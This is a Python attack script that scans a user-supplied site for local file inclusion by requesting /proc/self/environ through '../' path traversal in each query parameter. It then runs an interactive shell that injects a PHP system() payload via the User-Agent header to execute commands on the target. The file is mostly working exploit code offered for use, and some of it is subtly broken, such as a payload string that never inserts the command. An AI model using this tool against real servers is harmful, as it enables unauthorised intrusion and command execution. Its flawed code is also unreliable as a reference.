import re
import os
import random
import string
import requests
import urllib.parse

from rich.console import Console
from rich.progress import Progress
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory

class EnvironChecker:
    def __init__(self, url, depth=10, silent=False):
        self.console = Console()
        self.url = url
        self.depth = depth
        self.silent = silent
        self.random_user_agent = self._generate_random_string()
        self.LFI_TEST_FILES = [
            ('/proc/self/environ', re.compile(fr'{self.random_user_agent}')),
        ]
        self.HTTP_HEADERS = [
        "HTTP_USER_AGENT",
        "HTTP_ACCEPT",
        "HTTP_ACCEPT_ENCODING",
        "HTTP_ACCEPT_LANGUAGE",
        "HTTP_REFERER",
        "HTTP_CONNECTION",
        "HTTP_COOKIE",
        ]
        
    def _generate_random_string(self, length=10):
        return ''.join(random.choice(string.ascii_letters) for _ in range(length))

    def environ_check(self):
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        file_paths = []

        for file_path, _ in self.LFI_TEST_FILES:
            for i in range(self.depth):
                file_paths.append(('../' * i + file_path, _))
                file_paths.append((urllib.parse.quote('../' * i + file_path), _))

        console = Console()
        total_operations = len(params.keys()) * len(file_paths)

        if not self.silent:
            with Progress(console=console) as progress:
                return self._scan(params, file_paths, parsed_url, console, total_operations, progress)

        return self._scan(params, file_paths, parsed_url, console)

    def _scan(self, params, file_paths, parsed_url, console, total_operations=None, progress=None):
        task = progress.add_task("[cyan]Scanning...", total=total_operations) if progress else None

        headers = {'User-Agent': self.random_user_agent}

        for param_name in params.keys():
            for file_path, file_regex in file_paths:
                new_params = params.copy()
                new_params[param_name] = file_path
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                response = requests.get(fuzzed_url, headers=headers, verify=False)

                if any(header in response.text for header in self.HTTP_HEADERS):
                    if file_regex.search(response.text):
                        if not self.silent:
                            console.print(f'\n[bold red]Possible LFI2RCE detected (proc_self_environ: method)[/bold red] (/proc/self/environ method)', style='bold red')
                        return True, param_name
                
                if progress:
                    progress.update(task, advance=1)

        return False, None
    
    def web_shell(self, param_name):

        if self.environ_check():
            session = PromptSession(history=InMemoryHistory())        
            while True:
                try:
                    cmd = session.prompt(HTML('<ansired><b># </b></ansired>'))
                    if "exit" in cmd:
                        raise KeyboardInterrupt
                    elif not cmd:
                        continue
                    elif "clear" in cmd:
                        if os.name == 'posix':
                            os.system('clear')
                    elif os.name == 'nt':
                        os.system('cls')                                                             
                    if cmd.lower() in ["exit", "quit"]:
                        break
                    
                    cmd = "<?php echo '['; echo 'S]'; system('{cmd}'); echo '[E]';?>"
                    parsed_url = urllib.parse.urlparse(self.url)
                    params = urllib.parse.parse_qs(parsed_url.query)
                    new_params = params.copy()
                    new_params[param_name] = cmd
                    new_query = urllib.parse.urlencode(new_params, doseq=True)

                    fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                    
                    headers = {'User-Agent': cmd}
                    response = requests.get(fuzzed_url, headers=headers, verify=False)

                    pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL) 
                    response_content = pattern.search(response.text)
                    if response_content:
                        shell_output = response_content.group(1)
                        self.console.print(f"[bold green]{shell_output}[/bold green]")
                    else:
                        self.console.print("[bold red]No shell output.[/bold red]")
                    
                except KeyboardInterrupt:
                    self.console.print("[bold yellow][!] Exiting shell...[/bold yellow]")
                    break          

        return None

def main():
    url = input('Enter site URL to test: ')
    checker = EnvironChecker(url, silent=True)
    output, param_name = checker.environ_check()
    
    if output is not None:
        checker.web_shell(param_name)
    

if __name__ == "__main__":
    main()

